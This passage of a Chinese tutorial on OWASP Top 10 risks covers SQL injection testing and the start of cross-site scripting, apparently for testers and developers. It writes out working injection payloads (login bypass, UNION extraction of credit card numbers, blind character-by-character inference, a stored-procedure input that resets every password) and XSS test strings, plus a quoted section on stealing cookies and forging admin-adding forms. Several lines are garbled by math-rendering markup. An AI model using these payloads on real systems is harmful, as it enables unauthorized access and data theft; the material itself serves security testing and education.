　　如果你的策略是都是用存储过程的话，那么仅允许应用程序的账户执行这些查询，而不给他们直接访问数据库表的权限。诸如此类的最小权限法能够在很大程度上保证我们数据库的安全。<br>
　　输入验证白名单法：<br>
　　输入验证能够在数据传递到SQL查询前就察觉到输入是否正确合法，采用白名单而不是黑名单则能在更大程度上保证数据的合法性。<br>
防范SQL注入——测试篇<br>
对于测试人员来说，如何测试SQL注入漏洞是否存在呢？<br>
　　首先，我们将SQL注入攻击能分为以下三种类型：<br>
　　Inband：数据经由SQL代码注入的通道取出，这是最直接的一种攻击，通过SQL注入获取的信息直接反映到应用程序的Web页面上；<br>
　　Out-of-band：数据通过不同于SQL代码注入的方式获得（譬如通过邮件等）<br>
　　推理：这种攻击是说并没有真正的数据传输，但攻击者可以通过发送特定的请求，重组返回的结果从而得到一些信息。<br>
　　不论是哪种SQL注入，攻击者都需要构造一个语法正确的SQL查询，如果应用程序对一个不正确的查询返回了一个错误消息，那么就和容易重新构造初始的查询语句的逻辑，进而也就能更容易的进行注入；如果应用程序隐藏了错误信息，那么攻击者就必须对查询逻辑进行反向工程，即我们所谓的“盲SQL注入”<br>
　　黑盒测试及示例：<br>
　　这个测试的第一步是理解我们的应用程序在什么时候需要访问数据库，典型的需要访问数据库的时机是：<br>
　　认证表单：输入用户名和密码以检查是否有权限<br>
　　搜索引擎：提交字符串以从数据库中获取相应的记录<br>
　　电子商务站点：获取某类商品的价格等信息<br>
　　作为测试人员，我们需要列对所有输入域的值可能用于查询的字段做一个表单，包括那些POST请求的隐含字段，然后截取查询语句并产生错误信息。第一个测试往往是用一个单引号“‘”或是分号“；”，前者在SQL中是字符串终结符，如果应用程序没有过滤，则会产生一条错误信息；后者在SQL中是一条SQL语句的终结符，同样如果没有过滤，也会产生错误信息。在Microsoft SQL Server中，返回的错误信息一般是这样：</p>
<pre><code>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e14’
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the character string ‘’.
/target/target.asp, line 113
　　同样可用于测试的还有“--”以及SQL中的一些诸如“AND”的关键字，通常很常见的一种测试是在要求输入为数字的输入框中输入字符串，会返回如下的错误信息：
Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the varchar value ‘tester’ to a column of data type int.
/target/target.asp, line 113
</code></pre>
<p>类似上面这样的出错返回信息能让我们知道很多数据库的信息，通常不会返回那么多信息，会返回诸如“500 Server Error”的信息，那就需要“盲SQL注入”了。注意，我们需要对所有可能存在SQL注入漏洞的输入域进行测试，并且在每个测试用例时只变化一个域的值，从而才能找到真正存在漏洞的输入域。</p>
<p>下面我们看一下标准的SQL注入测试是怎样的。<br>
　　我们以下面的SQL查询为例：<br>
SELECT * FROM Users WHERE Username='<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant="normal">′</mo></msup><mi>A</mi><mi>N</mi><mi>D</mi><mi>P</mi><mi>a</mi><mi>s</mi><mi>s</mi><mi>w</mi><mi>o</mi><mi>r</mi><mi>d</mi><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup></mrow><annotation encoding="application/x-tex">username&#x27; AND Password=&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>password'<br>
　　如果我们在页面上输入以下的用户名和密码：<br>
$username = 1' or '1' = '1<br>
$password = 1' or '1' = '1<br>
　　那么整个查询语句就变为：</p>
<pre><code>SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'
</code></pre>
<p>假设参数值是通过GET方法传递到服务器的，且域名为www.example.com，那么我们的访问请求就是：</p>
<pre><code>http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1
</code></pre>
<p>对上面的SQL语句作简单分析后我们就知道由于该语句永远为真，所以肯定会返回一些数据，在这种情况下实际上并未验证用户名和密码，并且在某些系统中，用户表的第一行记录是管理员，那这样造成的后果则更为严重。<br>
　　另外一个查询的例子如下：</p>
<pre><code>SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))
</code></pre>
<p>在这个例子中，存在两个问题，一个是括号的用法，还有一个是MD5哈希函数的用法。对于第一个问题，我们可以很容易找到缺失的右括号解决，对于第二个问题，我们可以想办法使第二个条件失效。我们在查询语句的最后加上一个注释符以表示后面的都是注释，常见的注释起始符是/*（在Oracle中是--），也就是说，我们用如下的用户名和密码：<br>
　　<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><mi>o</mi><msup><mi>r</mi><mo mathvariant="normal">′</mo></msup><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><msup><mo>=</mo><mo mathvariant="normal">′</mo></msup><msup><mn>1</mn><mo mathvariant="normal">′</mo></msup><mo>)</mo><mo>)</mo><mi mathvariant="normal">/</mi><mo>∗</mo><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi></mrow><annotation encoding="application/x-tex">username = 1&#x27; or &#x27;1&#x27; = &#x27;1&#x27;))/*
　　</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel"><span class="mrel">=</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose">)</span><span class="mord">/</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span></span></span></span>password = foo<br>
　　那么整条SQL语句就变为：</p>
<pre><code>SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))
</code></pre>
<p>我们的URL请求就变为：</p>
<pre><code>http://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo
</code></pre>
<p>Union查询SQL注入测试<br>
　　还有一种测试是利用Union的，利用Union可以连接查询，从而从其他表中得到信息，假设我们有如下的查询：<br>
　　SELECT Name, Phone, Address FROM Users WHERE Id=<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>i</mi><mi>d</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">设</mi><mi mathvariant="normal">置</mi><mi>i</mi><mi>d</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi></mrow><annotation encoding="application/x-tex">id
　　然后我们设置id的值为：
　　</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">置</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span></span></span></span>id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCarTable<br>
　　那么整体的查询就变为：<br>
　　SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCarTable<br>
　　显然这样就能得到所有信用卡用户的信息。<br>
　　盲SQL注入测试<br>
　　在上面我们提到过盲SQL注入，即blind SQL injection，它意味着对于某个操作我们得不到任何信息，通常这是由于程序员已经编写了特定的出错返回页面，从而隐藏了数据库结构的信息。<br>
　　利用推理方法，有时候我们能够恢复特定字段的值。这种方法通常采用一组对服务器的布尔查询，依据返回的结果来推断结果的含义。仍然延续上面的www.example.com，有一个参数名为id，那么我们输入以下url请求：</p>
<pre><code>http://www.example.com/index.php?id=1'
</code></pre>
<p>显然由于语法错误，我们会得到一个预先定义好的出错页面，假设服务器上的查询语句为SELECT field1, field2, field3 FROM Users WHERE Id='<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><msup><mi>d</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">，</mi><mi mathvariant="normal">假</mi><mi mathvariant="normal">设</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">想</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">得</mi><mi mathvariant="normal">到</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">户</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">段</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">一</mi><mi mathvariant="normal">些</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">逐</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">符</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">读</mi><mi mathvariant="normal">取</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">户</mi><mi mathvariant="normal">名</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">值</mi><mi mathvariant="normal">。</mi><mi mathvariant="normal">在</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">里</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">使</mi><mi mathvariant="normal">用</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi><mi>S</mi><mi>U</mi><mi>B</mi><mi>S</mi><mi>T</mi><mi>R</mi><mi>I</mi><mi>N</mi><mi>G</mi><mo>(</mo><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo separator="true">,</mo><mi>s</mi><mi>t</mi><mi>a</mi><mi>r</mi><mi>t</mi><mo separator="true">,</mo><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo>)</mo><mi mathvariant="normal">，</mi><mi>A</mi><mi>S</mi><mi>C</mi><mi>I</mi><mi>I</mi><mo>(</mo><mi>c</mi><mi>h</mi><mi>a</mi><mi>r</mi><mo>)</mo><mi mathvariant="normal">，</mi><mi>L</mi><mi>E</mi><mi>N</mi><mi>G</mi><mi>T</mi><mi>H</mi><mo>(</mo><mi>t</mi><mi>e</mi><mi>x</mi><mi>t</mi><mo>)</mo><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">我</mi><mi mathvariant="normal">们</mi><mi mathvariant="normal">定</mi><mi mathvariant="normal">义</mi><mi>i</mi><mi>d</mi><mi mathvariant="normal">为</mi><mi mathvariant="normal">：</mi><mi mathvariant="normal">　</mi><mi mathvariant="normal">　</mi></mrow><annotation encoding="application/x-tex">Id&#x27;，假设我们想要得到用户名字段的值，那么通过一些函数，我们就可以逐字符的读取用户名的值。在这里我们使用以下的函数：
　　SUBSTRING (text, start, length)，ASCII (char)，LENGTH (text)
　　我们定义id为：
　　</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">假</span><span class="mord cjk_fallback">设</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">想</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">得</span><span class="mord cjk_fallback">到</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">户</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">段</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">逐</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">符</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">读</span><span class="mord cjk_fallback">取</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">户</span><span class="mord cjk_fallback">名</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">值</span><span class="mord cjk_fallback">。</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">里</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">使</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.10903em;">U</span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.00773em;">R</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">G</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">t</span><span class="mord mathdefault">h</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">A</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">L</span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">G</span><span class="mord mathdefault" style="margin-right:0.13889em;">T</span><span class="mord mathdefault" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathdefault">t</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">t</span><span class="mclose">)</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">定</span><span class="mord cjk_fallback">义</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">　</span><span class="mord cjk_fallback">　</span></span></span></span>Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1<br>
　　那么最终的SQL查询语句为：<br>
　　SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'<br>
　　那么，如果在数据库中有用户名的第一个字符的ASCII码为97的话，那么我们就能得到一个真值，那么我们就继续寻找该用户名的下一个字符；如果没有的话，那么我们就递增猜测第一个字符的ASCII码为98的用户名，这样反复下去就能判断出合法的用户名。<br>
　　那么，什么时候我们可以结束推理呢，我们假设id的值为：<br>
　　$Id=1' AND LENGTH(username)=N AND '1' = '1<br>
　　其中N是我们到目前为止已经分析的字符数目，那么整体的sql查询为：<br>
　　SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'<br>
　　这个查询的返回值如果是真，那我们就已经完成了推理并且我们已经得到了想要的数值，如果为假，则表示我们还要继续分析。<br>
　　这种盲SQL注入会要求我们输入大量的sql尝试，有一些自动化的工具能够帮我们实现，SqlDumper就是这样的一种工具，对MySQL数据库进行GET访问请求。</p>
<p>存储过程注入<br>
　　在上一篇《如何防范SQL注入—编程篇》中，我们提到使用存储过程是能够防范SQL注入的，但同时也要注意，存储过程如果使用不得当，使用存储过程的动态查询事实上也会造成一定的SQL注入漏洞。<br>
　　以下面的SQL存储过程为例：<br>
　　Create procedure user_login @username varchar(20), @passwd varchar(20) As<br>
　　Declare @sqlstring varchar(250)<br>
　　Set @sqlstring = ‘<br>
　　Select 1 from users<br>
　　Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd<br>
　　exec(@sqlstring)<br>
　　Go<br>
　　用户的输入如下：<br>
　　anyusername or 1=1'<br>
　　anypassword<br>
　　如果我们没有对输入进行验证，那么上面的语句就会返回数据库中的一条记录。<br>
　　我们再看下面的一条：<br>
　　Create procedure get_report @columnamelist varchar(7900) As<br>
　　Declare @sqlstring varchar(8000)<br>
　　Set @sqlstring = ‘<br>
　　Select ‘ + @columnamelist + ‘ from ReportTable‘<br>
　　exec(@sqlstring)<br>
　　Go<br>
　　如果用户输入是：<br>
　　1 from users; update users set password = 'password'; select *<br>
　　后面则显而易见，用户的所有密码都被更改且得到了报表信息。<br>
<strong>A2-跨站脚本（XSS）</strong><br>
排在OWASP TOP10第2位的是Cross Site Scripting（XSS），翻译成中文即“跨站脚本攻击”。它指的是恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意用户的特殊目的。XSS属于被动式的攻击，因为其被动且不好利用，所以许多人常忽略其危害性。<br>
以下内容转自百度空间的一篇关于OWASP的文章，个人觉得基本已经把跨站脚本攻击的内容阐述的比较清楚。<br>
如何寻找XSS漏洞，XSS攻击分成两类，一类是来自内部的攻击，主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。另一类则是来来自外部的攻击，主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开，然后利用下面的技术得到一个shell。<br>
如何利用<br>
传统的跨站利用方式一般都是攻击者先构造一个跨站网页，然后在另一空间里放一个收集cookie的页面，接着结合其它技术让用户打开跨站页面以盗取用户的cookie，以便进一步的攻击。这种方式太过于落后，对于弊端大家可能都知道，因为即便你收集到了cookie你也未必能进一步渗透进去，多数的cookie里面的密码都是经过加密的，如果想要cookie欺骗的话，同样也要受到其它的条件的限约。而另一种思路，则从一定程度上解决上述的问题。比较成熟的方法是通过跨站构造一个表单，表单的内容则为利用程序的备份功能或者加管理员等功能得到一个高权限。下面将详细的介绍这种技术。<br>
寻找跨站漏洞<br>
如果有代码的话比较好办，我们主要看代码里对用户输入的地方和变量有没有做长度和对”&lt;”,”&gt;”,”;”,”’”等字符是否做过滤。还有要注意的是对于标签的闭合，像测试QQ群跨站漏洞的时候，你在标题处输入<script>alert(‘test’)</script>，代码是不会被执行的，因为在源代码里，有其它的标签未闭合，如少了一个</script>，这个时候，你只要闭合一个</script>，代码就会执行，如：你在标题处输入</script><script>alert(‘test’)</script>，这样就可以弹出一个test的框。<br>
如何利用<br>
跨站脚本(Cross-site scripting，XSS)漏洞是Web应用程序中最常见的漏洞之一。如果您的站点没有预防XSS漏洞的固定方法，那么就存在XSS漏洞。这个利用XSS漏洞的病毒之所以具有重要意义是因为，通常难以看到XSS漏洞的威胁，而该病毒则将其发挥得淋漓尽致。<br>
这个利用XSS漏洞的蠕虫病毒的特别之处在于它能够自我传播。myspace.com上的一个用户希望自己能够在网站的友人列表上更“受欢迎”。但是该用户不是通过普通的方法来结交新朋友，而是在自己的个人信息中添加了一些代码，导致其他人在访问他的页面时，会不知不觉地利用XSS漏洞将他加为好友。更恶劣的是，它会修改这些人的个人信息，使其他人在访问这些被感染的个人信息时，也会被感染。由于这种呈指数传播的方式，这种病毒才很快就被发现。<br>
很难预防站点中的XSS。因此一定要认真检查您的应用程序是否存在XSS漏洞。此外，WebLogic Server的encodeXSS()也可以有所帮助。可以试着针对所有牵涉到使用encodeXSS()或其他某个筛选方法的输出找出一种编码模式——找出对一种编码模式来说不正确的应用程序往往要比找出XSS漏洞要容易的多。更重要的是，不要认为，就因为XSS漏洞是一个常见问题，所以它危害不大。<br>
之所以出现XSS漏洞有两个原因。首先，HTML没有明确区分代码和数据。无法确定指出“这个字符串表示的是数据”。您可以将其放入引号中，但是数据是否包含引号呢？……其次，程序在将用户数据发送回浏览器时没有进行有效的转义。这导致包含有（例如说）引号的数据被放入页面中，从而引发了问题。而AJAX要提供的好处是，它包含一个专用渠道XML链接，其中全是数据而没有代码。这样，就有可能让客户端AJAX引擎负责对字符串进行转义、检测不正确的值，等等。说是这么说，直到AJAX更为成熟（可能也更为标准化）之前，它只会导致错误的编程和安全漏洞。<br>
XSS漏洞可能造成的后果包括窃取用户会话，窃取敏感信息，重写Web页面，重定向用户到钓鱼网站等，尤为严重的是，XSS漏洞可能使得攻击者能够安装XSS代理，从而攻击者能够观察到该网站上所有用户的行为，并能操控用户访问其他的恶意网站。<br>
对于XSS漏洞，我们有两种常见的措施，第一种就是消除漏洞，简而言之就是在输出页面上不提供任何用户的输入信息；另外一种就是想办法来抵御这种漏洞，可以采用对所有用户的输入编码后再输出（可以用OWASP的ESAPI），也可以对所有用户输入进行“白名单”验证，另外，OWASP还提供了AntiSamy对HTML页面做优化以消除这个漏洞。<br>
防范XSS跨站脚本攻击——测试篇<br>
XSS也是一种对浏览器的解释器的代码注入攻击，这些攻击能够通过HTML，JavaScript，VBScript，ActiveX，Flash等其他客户端语言执行，同时，这些攻击也可能造成用户信息泄露，配置更改，cookie窃取等造成危害，甚至能够用于对Web服务器进行DOS攻击。<br>
　　与大部分攻击不同的是，大部分攻击往往只涉及2方（攻击者和网站，攻击者和受害者），而XSS则涉及3方，攻击者、客户端、网站，XSS的目的就是窃取客户端的cookie或是其他信息以冒充客户在网站上进行认证，进而在网站上操作任何想进行的操作。<br>
　　下面我们看看到底有哪些类型的XSS攻击：<br>
　　Stored XSS（存储式跨站脚本攻击）<br>
　　这是最强大的一种XSS攻击，所谓存储跨站攻击是指用户提交给Web应用程序的数据首先就被永久的保存在服务器的数据库，文件系统或其他地方，后面且未做任何编码就能显示到Web页面，最典型的就是2005年在MySpace发现的XSS漏洞以及利用该漏洞的Samy MySpace Worm。<br>
　　举例，假设我们的网站允许我们给其他用户留言，但事实上我们没有留言而是写入了一段代码：<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303366228.png" alt="" loading="lazy"><br>
那么服务器将会存储这些信息，当用户点击我们伪造的留言时，他的浏览器就会执行我们的脚本。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1628303359847.png" alt="" loading="lazy"><br>
Reflected XSS（反射跨站脚本攻击）<br>
　　这是最常见也是最知名的XSS攻击，当Web客户端提交数据后，服务器端立刻为这个客户生成结果页面，如果结果页面中包含未验证的客户端输入数据，那么就会允许客户端的脚本直接注入到动态页面中。传统的例子是站点搜索引擎，如果我们搜索一个包含特殊HTML字符的字符串时，通常在返回页面上仍然会有这个字符串来告知我们搜索的是什么，如果这些返回的字符串未被编码，那么，就会存在XSS漏洞了。<br>
